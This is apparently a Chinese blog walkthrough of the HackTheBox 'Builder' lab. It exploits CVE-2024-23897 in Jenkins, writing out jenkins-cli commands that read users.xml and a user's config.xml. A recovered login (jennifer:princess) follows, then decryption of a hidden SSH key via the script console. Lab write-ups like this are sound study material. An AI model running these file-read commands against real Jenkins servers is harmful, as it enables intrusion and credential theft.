---
title: HackTheBox-Builder
date: 2025-4-7 20:00:00
tags: 红队
categories: 红队打靶-Linux
---



# nmap

![image-20250407102020194](Builder/image-20250407102020194.png)

# 8080端口

左下角有版本信息，搜索到该版本存在本地文件读取漏洞

![image-20250407112131730](Builder/image-20250407112131730.png)

## dirsearch

![image-20250407102039160](Builder/image-20250407102039160.png)

/api下还有一些目录，但都没有有用信息

![image-20250407112236007](Builder/image-20250407112236007.png)

## cve-2024-23897

先从靶机下载jar包

```
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
```

读取敏感目录，得到jenkins用户目录在`/var/jenkins_home`下

![image-20250407111931155](Builder/image-20250407111931155.png)

那么可以直接读取到user.txt

![image-20250407112551284](Builder/image-20250407112551284.png)

### 目录结构

![img](Builder/1850f94518a54a9cae64391e7440ef97.png)

![img](Builder/c46faf29e7954de881ea8a0d8c569c15.png)

#### user.xml

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 -http reload-job "@/var/jenkins_home/users/users.xml"
```

![image-20250407114855940](Builder/image-20250407114855940.png)

#### /jennifer_12108429903186576833/config.xml

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 -http reload-job "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
```

![image-20250407114840670](Builder/image-20250407114840670.png)

![image-20250407114809848](Builder/image-20250407114809848.png)

```
jennifer:princess
```

#### 登录到jenkins

![image-20250407115846307](Builder/image-20250407115846307.png)

但是私钥还是隐藏的，在源码中发现了隐藏的私钥，是base64加密的

![image-20250407121222159](Builder/image-20250407121222159.png)

[jenkins：利用script console - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/376186.html)

该文章中有解密函数的使用，对该段进行解密即可得到私钥，使用私钥进行ssh连接，将权限设置为600，然后连接

![image-20250407130315077](Builder/image-20250407130315077.png)